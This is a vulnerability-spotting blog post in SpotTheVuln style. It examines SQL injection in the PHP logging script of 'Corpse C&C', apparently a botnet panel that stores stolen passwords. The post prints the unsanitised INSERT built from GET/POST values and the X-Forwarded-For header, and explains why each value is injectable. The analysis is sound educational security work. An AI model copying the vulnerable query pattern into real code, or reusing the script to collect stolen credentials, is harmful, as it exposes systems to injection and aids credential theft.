---
layout: post
title: Floods - SQL Injection
tags:
- PHP
- Solution
- SQL Injection
status: publish
type: post
published: true
meta:
  aktt_notify_twitter: 'yes'
  _aktt_hash_meta: ! '#secure #code #dev'
  _edit_last: '2'
  aktt_tweeted: '1'
---
## Details
__Affected Software:__ Corpse C&C

__Fixed in Version:__  ?

__Issue Type:__ SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/07/floods/">Found Here</a>

## Description
This week's bug is in Corpse C&C. SpotTheVuln reader Christina hits it right on the head,  line 32 contains a ridiculous amount of SQL injection. Most of the parameters passed to the INSERT statement results in SQL injection. $id, $info, and $user are all set directly from $_GET or $_POST and are used in the SQL statement without any sanitization. Despite its name, $real_ip is also completely attacker controlled and can be used for SQL injection. Getenv("HTTP_X_FORWARDED_FOR") doesn't sanitize the user controlled value in any way. For some reason, many developers assume the X-Forwarded-For header will only specify an IP address or domain name. X-Forwarded-For can contain any characters (including angle brackets, single quotes, and double quotes).

## Vulnerable Code
Line 32

{% highlight html+php linenos %}
<?php

$use_mysql = 1;

if ($use_mysql == 1) {
	require_once('./mysqllog.php');
	require_once('./geoipcity.inc');
}

$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");

if (isset($_GET['id'])) {
	$id = $_GET['id'];
} else {
	$id = $_POST['id'];
}

$info = $_POST['info'];
$user = $_POST['user'];

if ($use_mysql == 1) {
	//-----------------------------------
	$gi = geoip_open('./GeoIPCity.dat', GEOIP_STANDARD);
	$record = geoip_record_by_addr($gi, $ip);
	geoip_close($gi);
	//-----------------------------------
	$info = decode_string($info);
	if(@!mysql_connect($mysql_host,$mysql_login,$mysql_pass)) {echo '<p class="err"> Error. Cant connect to mysql server </p>'; }
	if(@!mysql_selectdb($mysql_db)) {echo '<p class="err"> Error. Cant connect to DB</p>'; }
	$query = 'INSERT INTO pass (add_date,id,uidlog,ip_real,ip,pass,country,city,zip)
			  VALUES (now(), "'. $id . '", "'. $user .'", "'. $real_ip . '", "'. $ip .'", "'. $info .'", "'. $record->country_name .'", "'. $record->city .'", "'. $record->postal_code .'")';
	if(@!mysql_query($query)) {echo '<p class="err"> Error. Cant execute query</p>';  }
}
else {
	$date = date("Y-m-d");
	$time=date("H:i:s");

	list($year, $month, $day) = explode('-', $date);
	$filename = "pass.$day.$month.txt";
	$log = "$info@@@@@$user@@@@@$id@@@@@$real_ip@@@@@$ip@@@@@$date@@@@@$time\n";
	$fh = fopen("logs/$filename", "a+");
	fputs($fh, $log);
	fclose($fh);
}

function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return addslashes($bindata);
}
?>
{% endhighlight %}
